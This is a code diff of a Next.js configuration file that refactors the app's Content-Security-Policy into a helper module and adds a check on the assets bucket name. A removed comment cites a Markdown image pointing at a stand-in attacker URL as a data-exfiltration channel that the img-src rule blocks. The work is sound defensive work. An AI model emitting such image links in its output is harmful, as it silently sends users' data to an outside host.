@@ -1,43 +1,29 @@
 import type { NextConfig } from "next";
 
-/**
- * Content-Security-Policy for app pages. Only directives that cannot break
- * Clerk, Stripe redirects, KaTeX, Mermaid or Next's inline scripts (no
- * script-src/style-src here):
- * - frame-src: iframes, and any navigation an embedded frame makes of itself,
- *   may only load our own origin (/embed/react) plus the hosts Clerk's own CSP
- *   helper allows (Cloudflare Turnstile, Stripe.js frames). A react_artifact
- *   can therefore not navigate its iframe to an external page.
- * - frame-ancestors 'self': same as X-Frame-Options SAMEORIGIN.
- * - object-src 'none', base-uri 'self': no plugins, no <base> hijacking.
- * - img-src: images may come only from our own origin, inline data:/blob:
- *   URLs, Clerk's avatar/logo host (the img-src of Clerk's own CSP helper,
- *   @clerk/nextjs content-security-policy.js), and the assets bucket that
- *   /api/asset/:id 302-redirects to (a signed storage.googleapis.com URL).
- *   An image URL is a request the page makes by itself, so this closes the
- *   "![](https://attacker/?data=…)" exfiltration channel for AI-written or
- *   hostile Markdown (the renderer also refuses such images, see
- *   src/lib/markdown-images.ts). The bucket is scoped by path when
- *   ASSETS_BUCKET is known at build time (the Docker build passes it); CSP
- *   ignores paths after a redirect, so the signed URL still matches, while a
- *   direct link to someone else's bucket does not.
- * /embed/* is excluded: /embed/react sets its own stricter nonce CSP.
- */
-const ASSETS_BUCKET = process.env.ASSETS_BUCKET?.trim();
-const ASSET_IMG_SOURCE =
-  ASSETS_BUCKET && /^[a-z0-9][a-z0-9._-]{1,220}$/.test(ASSETS_BUCKET)
-    ? `https://storage.googleapis.com/${ASSETS_BUCKET}/`
-    : "https://storage.googleapis.com";
+import { buildAppCsp, isValidBucketName } from "./src/lib/ops/csp";
 
-const APP_CSP = [
-  "frame-src 'self' https://challenges.cloudflare.com https://js.stripe.com https://*.js.stripe.com https://hooks.stripe.com",
-  `img-src 'self' data: blob: https://img.clerk.com ${ASSET_IMG_SOURCE}`,
-  "frame-ancestors 'self'",
-  "object-src 'none'",
-  "base-uri 'self'",
-].join("; ");
+/**
+ * Content-Security-Policy for app pages: see src/lib/ops/csp.ts for every
+ * directive and why each source is there. Headers are fixed at build time,
+ * so the assets bucket and Clerk's key must be known here (both are Docker
+ * build arguments). /embed/* is excluded: /embed/react sets its own nonce CSP.
+ */
+const ASSETS_BUCKET = process.env.ASSETS_BUCKET?.trim() || undefined;
+if (ASSETS_BUCKET && !isValidBucketName(ASSETS_BUCKET)) {
+  // A malformed name would silently drop the bucket from img-src.
+  throw new Error("ASSETS_BUCKET is not a valid bucket name");
+}
+
+const APP_CSP = buildAppCsp({
+  assetsBucket: ASSETS_BUCKET,
+  clerkPublishableKey: process.env.NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY,
+  clerkProxyUrl: process.env.NEXT_PUBLIC_CLERK_PROXY_URL,
+});
 
 const nextConfig: NextConfig = {
+  // The bucket the CSP above was built for, so the startup check can refuse a
+  // build whose img-src does not match the bucket in use (lib/ops/env.ts).
+  env: { STUDYOS_BUILD_ASSETS_BUCKET: ASSETS_BUCKET ?? "" },
   // Emit a self-contained server (.next/standalone) for the Docker/Cloud Run image.
   output: "standalone",
   // The Prisma client + query-engine binary live under src/generated/prisma.
